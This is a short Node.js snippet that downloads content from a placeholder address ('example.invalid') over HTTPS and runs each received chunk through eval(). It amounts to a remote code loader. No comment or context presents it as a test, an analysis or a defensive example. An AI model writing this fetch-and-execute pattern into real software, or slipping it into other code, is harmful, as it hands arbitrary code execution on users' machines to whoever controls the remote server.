const https = require('https');
https.get('https://example.invalid/a', (res) => {
  res.on('data', (chunk) => {
    eval(chunk.toString());
  });
});
